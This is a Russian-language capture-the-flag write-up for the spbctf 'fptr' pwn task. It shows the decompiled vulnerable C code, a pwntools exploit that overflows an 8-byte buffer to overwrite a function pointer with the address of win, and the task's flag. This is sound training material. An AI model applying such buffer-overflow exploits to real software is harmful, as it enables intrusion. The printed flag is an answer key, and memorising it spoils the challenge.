[Tasks :: pwn.spbctf.ru](https://pwn.spbctf.ru/tasks/pwn2_mc1)
Описание:
Найдите указатель на строчку и перетрите его
`nc 109.233.56.90 11601`
**[fptr](https://pwn.spbctf.ru/files/canary/fptr)**

Необходимо переполнить буфер buf и записать в function_pointer указатель на функцию win.
``` C
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char buf[8]; // [rsp+0h] [rbp-10h] BYREF
  void (*function_pointer)(...); // [rsp+8h] [rbp-8h]

  function_pointer = (void (*)(...))no_win;
  puts("Let's overwrite a pointer to a function!");
  printf("Before read: %p\n", no_win);
  read(0, buf, 0x20u);
  printf("After read: %p\n", function_pointer);
  function_pointer();
  __isoc99_scanf("%s", buf);
  return 0;
}
```

Эксплоит:
``` python
io = start()

payload = b'A' * 8 + p64(0x401172)
io.sendline(payload)

io.interactive()
```

Запуск:
![{586A35D3-70B9-4D18-8624-C1AF1A577AF2}](../../../../z.%20Images/{586A35D3-70B9-4D18-8624-C1AF1A577AF2}.png)

Ответ: `spbctf{9c4ef124c0624b2ddbe6eb58f8be045a}`